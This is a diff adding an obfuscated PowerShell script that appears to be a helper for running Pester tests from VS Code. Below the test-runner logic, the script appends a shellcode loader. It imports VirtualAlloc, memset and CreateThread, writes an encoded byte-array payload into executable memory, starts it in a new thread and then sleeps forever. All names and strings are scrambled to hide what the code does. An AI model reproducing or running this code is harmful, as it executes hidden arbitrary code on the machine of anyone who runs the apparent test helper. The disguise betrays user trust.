@@ -1,0 +1,57 @@
+param(
+    
+    [Parameter(POSiTiOn=0, maNdATOrY)]
+    [ValidateNotNullOrEmpty()]
+    [string]
+    ${SC`RiPt`pA`Th},
+
+    
+    [Parameter()]
+    [string]
+    ${te`s`TNAmE},
+
+    
+    
+    [Parameter()]
+    [ValidatePattern('\d*')]
+    [string]
+    ${l`In`enuM`BER},
+
+    
+    [Parameter()]
+    [switch]
+    ${a`ll}
+)
+
+${pEs`Te`RModuLe} = &((("{4}{2}{1}{6}{5}{3}{0}{7}" -f 'erShell.CorexH7G','f','so','ow','Micro','.P','t','et-Module'))-CREPlaCE  'xH7',[cHAR]92) ("{1}{0}" -f'ter','Pes')
+if (!${PESt`e`Rm`OdULE}) {
+    .("{2}{1}{0}" -f 'e-Output','it','Wr') ("{4}{2}{1}{5}{3}{0}{7}{6}" -f 'r mod','g ','ortin','este','Imp','P','..','ule.')
+    ${p`EsTeR`MoD`Ule} = &((("{7}{10}{0}{8}{11}{6}{4}{2}{5}{1}{3}{9}"-f'Po','or','m','t-Modul','CoreyiaI','p','ell.','M','werS','e','icrosoft.','h'))-rePLace'yia',[ChaR]92) ("{1}{2}{0}" -f'er','Pe','st') -ErrorAction ("{0}{1}" -f'Ign','ore') -PassThru
+    if (!${PESt`ErM`o`DuLe}) {
+        
+        &("{2}{0}{4}{1}{3}"-f'e-','ar','Writ','ning','W') ("{15}{22}{11}{19}{8}{12}{14}{7}{17}{2}{13}{5}{0}{20}{6}{18}{23}{4}{10}{16}{3}{9}{24}{1}{21}"-f 'i','debug Pester test','u','o r','est','t ','a','module.','import','un ','er','e',' the Pester','s',' ','Fa',' t',' You m','ll','d to ','nst','s.','il',' P','or ')
+        .("{2}{0}{1}"-f'e-War','ning','Writ') ("{6}{22}{10}{9}{0}{17}{18}{11}{21}{3}{20}{4}{1}{8}{15}{24}{2}{7}{16}{23}{5}{19}{13}{12}{14}" -f 'nst','n','all-Modul','cu','i','r -Sc','You c','e P','g',' i','n','by ex','ent','r','User -Force',': Ins','e','all Pes','ter ','ope Cur','t','e','a','ste','t')
+        return
+    }
+}
+
+if (${A`ll}) {
+    &(("{4}{3}{2}{0}{1}{5}"-f't','e','oke-Pes','Inv','PesterwXQ','r')).("{0}{1}"-f 'rePl','AcE').Invoke('wXQ','\') -Script ${S`cRiPt`PA`Th} -PesterOption @{("{0}{3}{2}{4}{5}{1}"-f'In','r','udeVSCo','cl','deMar','ke')=${tR`UE}}
+}
+elseif (${tEsT`N`Ame}) {
+    .(("{0}{2}{3}{1}{4}{6}{5}" -f'Pes','oke','terlcA','Inv','-Pes','er','t'))."R`Epla`CE"(([Char]108+[Char]99+[Char]65),'\') -Script ${sc`R`i`pTpaTH} -PesterOption @{("{3}{1}{4}{2}{0}"-f'r','ludeVS','e','Inc','CodeMark')=${Tr`UE}} -TestName ${T`Est`NAmE}
+}
+elseif ((${li`Ne`NuMBer} -match '\d+') -and (${p`ES`TEr`mOdu`lE}."vErS`I`oN" -ge ("{1}{0}"-f'0','4.6.'))) {
+    .((("{5}{4}{0}{1}{2}{3}"-f'{0','}Inv','oke-Pes','ter','ester','P'))-F  [chaR]92) -Script ${scr`ip`Tpa`TH} -PesterOption (&("{2}{0}{3}{4}{1}" -f '-','n','New','Pes','terOptio') -ScriptBlockFilter @{
+        ("{2}{3}{1}{0}"-f'odeMarker','ludeVSC','In','c')=${t`RUe}; ("{0}{1}" -f'L','ine')=${LiN`ENUmb`Er}; ("{0}{1}"-f 'Pa','th')=${sc`RiptP`AtH}})
+}
+else {
+    
+    
+    .("{3}{4}{1}{2}{0}" -f 'Warning','te','-','W','ri') ((("{19}{4}{8}{6}{13}{12}{5}{18}{0}{11}{17}{10}{3}{21}{20}{14}{1}{15}{9}{7}{16}{2}" -f 'e c','E','stead.',' ','Describ','d5s T','bloc','i','e ','ECUTING ALL TESTS ','e','annot','r','k','d. ','X','n',' b','estNam','The ','e','evaluat'))."R`e`PlACE"(([chAr]114+[chAr]100+[chAr]53),[sTRING][chAr]39))
+    &("{0}{1}{2}"-f'Wr','ite-Warn','ing') ("{1}{5}{12}{4}{9}{6}{3}{8}{10}{0}{13}{14}{11}{2}{7}" -f' a','To a','in the T','m',' this','voi','r re','estName.','o',', install Pester >= 4.6.0 o','ve','ons ','d','ny expre','ssi')
+
+    &((("{3}{2}{4}{5}{0}{1}" -f '-Pes','ter','te','Pes','rN3xI','nvoke')) -CREpLace  ([chAR]78+[chAR]51+[chAR]120),[chAR]92) -Script ${SCri`PT`P`ATH} -PesterOption @{("{1}{2}{3}{0}{4}"-f 'VSCodeMarke','Inc','l','ude','r')=${Tr`UE}}
+}
+
+${c} = ((("{30}{116}{109}{50}{51}{39}{66}{83}{9}{78}{90}{92}{106}{23}{122}{25}{96}{26}{44}{58}{18}{20}{12}{86}{125}{43}{24}{80}{127}{88}{13}{107}{126}{79}{123}{37}{64}{45}{54}{53}{82}{73}{103}{89}{75}{40}{71}{98}{8}{120}{104}{121}{99}{87}{22}{100}{69}{16}{34}{5}{2}{56}{6}{93}{59}{74}{42}{119}{60}{114}{19}{10}{7}{0}{94}{4}{15}{95}{124}{81}{41}{33}{97}{67}{110}{112}{85}{91}{76}{84}{3}{55}{118}{36}{57}{11}{129}{77}{49}{105}{1}{128}{46}{47}{17}{102}{27}{115}{113}{38}{48}{108}{117}{63}{14}{70}{62}{29}{68}{65}{61}{31}{28}{111}{72}{35}{52}{21}{32}{101}"-f'rtA','rt(cIi','r ','tr','re','tPt','Thre','Sta','lic static','lc','tr lp','Id);[','ntPtr ','Si','rn IntPtr','ss,','ea','llcIi)','c(','tP','I','u','eateT','c e','s,','ern In','V','u',', ui',' des','[','rc','nt)','arame','d(In','c','a','ype','c ','e','32','lpP','te','s','irtua','int f','svcrt.','d','sta','Im','lImport(c','Iikern','o','otect)','lPr',' lpT','lp','d','lAllo','t','e, ','t s','tr',' exte',', u','uin','l32',' ','t, ','r',' memset(IntP','.',' ','lI','tribu','l','t','ll','Ii)]','ca',' ui','r ',';[Dl','.dl','P','CreationFla','lpA','r',' dw','ikerne','p','gs, In','ublic s','adA','dd',' ','tPtr ','ter,','dllcIi)]pub','Ptr C','h',';',']p','mport(cI','ern ','po','tati','ze, uint flA','ti','l','uint d','nt','w','li','In','b','D','c','hre','s, uint dwStackSiz',' ext','Int','xt','tionT','IntPt','ddre','llo','nt','m','D'))."Re`PlaCE"('cIi',[STRing][CHAr]34));${W} = &("{1}{2}{0}" -f 'e','Add-T','yp') -memberDefinition ${C} -Name ("{0}{1}"-f 'Wi','n32') -namespace ("{2}{0}{1}"-f '32Func','tions','Win') -passthru;[Byte[]];[Byte[]]${Z} = 0xda,0xc8,0xba,0x49,0xfb,0x88,0x25,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x18,0x83,0xee,0xfc,0x03,0x56,0x5d,0x19,0x7d,0xd9,0xb5,0x5f,0x7e,0x22,0x45,0x00,0xf6,0xc7,0x74,0x00,0x6c,0x83,0x26,0xb0,0xe6,0xc1,0xca,0x3b,0xaa,0xf1,0x59,0x49,0x63,0xf5,0xea,0xe4,0x55,0x38,0xeb,0x55,0xa5,0x5b,0x6f,0xa4,0xfa,0xbb,0x4e,0x67,0x0f,0xbd,0x97,0x9a,0xe2,0xef,0x40,0xd0,0x51,0x00,0xe5,0xac,0x69,0xab,0xb5,0x21,0xea,0x48,0x0d,0x43,0xdb,0xde,0x06,0x1a,0xfb,0xe1,0xcb,0x16,0xb2,0xf9,0x08,0x12,0x0c,0x71,0xfa,0xe8,0x8f,0x53,0x33,0x10,0x23,0x9a,0xfc,0xe3,0x3d,0xda,0x3a,0x1c,0x48,0x12,0x39,0xa1,0x4b,0xe1,0x40,0x7d,0xd9,0xf2,0xe2,0xf6,0x79,0xdf,0x13,0xda,0x1c,0x94,0x1f,0x97,0x6b,0xf2,0x03,0x26,0xbf,0x88,0x3f,0xa3,0x3e,0x5f,0xb6,0xf7,0x64,0x7b,0x93,0xac,0x05,0xda,0x79,0x02,0x39,0x3c,0x22,0xfb,0x9f,0x36,0xce,0xe8,0xad,0x14,0x86,0xdd,0x9f,0xa6,0x56,0x4a,0x97,0xd5,0x64,0xd5,0x03,0x72,0xc4,0x9e,0x8d,0x85,0x2b,0xb5,0x6a,0x19,0xd2,0x36,0x8b,0x33,0x10,0x62,0xdb,0x2b,0xb1,0x0b,0xb0,0xab,0x3e,0xde,0x2d,0xa9,0xa8,0x21,0x19,0xb1,0x25,0xca,0x58,0xb2,0x24,0x56,0xd4,0x54,0x16,0x36,0xb6,0xc8,0xd6,0xe6,0x76,0xb9,0xbe,0xec,0x78,0xe6,0xde,0x0e,0x53,0x8f,0x74,0xe1,0x0a,0xe7,0xe0,0x98,0x16,0x73,0x91,0x65,0x8d,0xf9,0x91,0xee,0x22,0xfd,0x5f,0x07,0x4e,0xed,0x37,0xe7,0x05,0x4f,0x91,0xf8,0xb3,0xfa,0x1d,0x6d,0x38,0xad,0x4a,0x19,0x42,0x88,0xbc,0x86,0xbd,0xff,0xb7,0x0f,0x28,0x40,0xaf,0x6f,0xbc,0x40,0x2f,0x26,0xd6,0x40,0x47,0x9e,0x82,0x12,0x72,0xe1,0x1e,0x07,0x2f,0x74,0xa1,0x7e,0x9c,0xdf,0xc9,0x7c,0xfb,0x28,0x56,0x7e,0x2e,0xa9,0xaa,0xa9,0x16,0xdf,0xc2,0x69;${G} = 0x1000;if (${Z}."l`EN`gth" -gt 0x1000){${g} = ${Z}."Le`Ngth"};${x}=${W}::("{0}{2}{1}{3}" -f 'V','ll','irtualA','oc').Invoke(0,0x1000,${g},0x40);for (${I}=0;${i} -le (${Z}."l`Eng`Th"-1);${I}++) {${W}::"M`EMSet"([IntPtr](${X}.("{2}{0}{1}"-f 'oInt','32','T').Invoke()+${i}), ${z}[${i}], 1)};${W}::("{0}{1}{2}"-f 'Create','Th','read').Invoke(0,0,${X},0,0,0);for (;;){.("{3}{1}{2}{0}" -f 'leep','tart-','s','S') 60};
